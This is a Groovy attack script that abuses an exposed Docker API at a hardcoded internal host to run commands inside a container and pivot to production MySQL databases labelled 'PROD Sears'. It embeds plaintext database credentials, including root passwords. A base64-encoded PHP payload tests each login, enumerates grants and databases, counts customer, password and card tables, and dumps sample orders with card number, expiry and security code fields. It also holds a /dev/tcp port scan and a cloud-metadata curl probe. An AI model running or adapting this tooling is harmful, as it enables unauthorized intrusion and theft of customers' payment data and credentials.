// Docker exec to reach PROD Sears via container with multiple NICs
// Container 5b32e909c295 on Docker host 172.27.140.148 can reach 172.27.141.24

def dockerApi = "http://172.27.140.148:4243"
def containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(8000)
    conn.setReadTimeout(60000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

// PHP script that runs MySQL queries from container perspective
// Container has different source IP → different MySQL ACLs
def phpScript = '''<?php
$creds = [
  ["172.27.141.24", 3308, "dbcronproductos", "0c1A0ZW0Kh#wjqdRHV\$b63A", "tienda"],
  ["172.27.141.24", 3308, "dbsmartinsight", "CD49uwg*iG9m5d+y", "tienda"],
  ["172.27.141.24", 3308, "app_t1", "jpTSf99UzLxC#t>", "payment_t1"],
  ["172.27.141.24", 3308, "adaxxidb", "JTQ6PrkecY3y1kVN", "tienda"],
  ["172.27.141.24", 3308, "root", "auroraboreal00", "mysql"],
  ["172.27.141.24", 3308, "root", "JenkisLegasy25", "mysql"],
  ["172.27.141.6", 3312, "dbcronproductos", "0c1A0ZW0Kh#wjqdRHV\$b63A", "tienda"],
  ["172.27.141.6", 3312, "app_t1", "jpTSf99UzLxC#t>", "payment_t1"],
];

foreach($creds as [$h,$p,$u,$pw,$db]) {
  echo "\\n--- $u@$h:$p ---\\n";
  $c = new mysqli($h, $u, $pw, $db, $p);
  if($c->connect_error) {
    echo "FAIL: ".$c->connect_error."\\n";
    continue;
  }
  echo "AUTH_OK server_info: ".$c->server_info."\\n";
  $r=$c->query("SHOW GRANTS FOR CURRENT_USER()");
  if($r){while($row=$r->fetch_row()){echo "GRANT: ".$row[0]."\\n";}}
  $r=$c->query("SHOW DATABASES");
  $dbs=[];
  if($r){while($row=$r->fetch_row()){echo "DB: ".$row[0]."\\n"; $dbs[]=$row[0];}}
  
  // Count key tables
  foreach(["pedidos","clientes","clientescontrasena","datostarjeta","cybersource_transacciones","card","client","transaction","suscripciones"] as $tbl){
    $r=$c->query("SELECT COUNT(*) FROM $tbl");
    if($r){$cnt=$r->fetch_row()[0]; echo "COUNT($tbl): $cnt\\n";}
  }
  
  // Sample pedidos if accessible
  $r=$c->query("SELECT idpedido,fechapedido,total,tipotarjeta,nombre,numero,mes,ao,seguridad FROM pedidos LIMIT 5");
  if($r && $r->num_rows>0){
    echo "PEDIDOS_SAMPLE:\\n";
    while($row=$r->fetch_assoc()){
      echo json_encode($row)."\\n";
    }
  }
  $c->close();
}
echo "\\nDONE\\n";
?>'''

// Base64 encode to avoid escaping issues
def phpB64 = phpScript.getBytes("UTF-8").encodeBase64().toString()
def fullCmd = "echo '${phpB64}' | base64 -d > /tmp/_prodsears.php && php /tmp/_prodsears.php 2>&1; rm -f /tmp/_prodsears.php"

println "=== DOCKER EXEC → PHP MySQL to PROD Sears ==="
println execIn(fullCmd)

// Also try netcat TCP probe from container
def netCmd = '''
echo "=== TCP PROBE FROM CONTAINER ==="
for h_p in "172.27.141.24:3308" "172.27.141.24:22" "172.27.141.24:80" "172.27.141.4:3306" "172.27.141.4:3308" "172.27.141.4:3312"; do
  h="${h_p%%:*}"; p="${h_p#*:}"
  timeout 3 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN|$h_p" || echo "CLOSED|$h_p"
done
echo "SOURCE IP:"
curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/local-ipv4 2>/dev/null || hostname -I
'''
println "\n=== CONTAINER NETWORK PROBE ==="
println execIn(netCmd)

println "=== FIN DOCKER PROD SEARS ==="
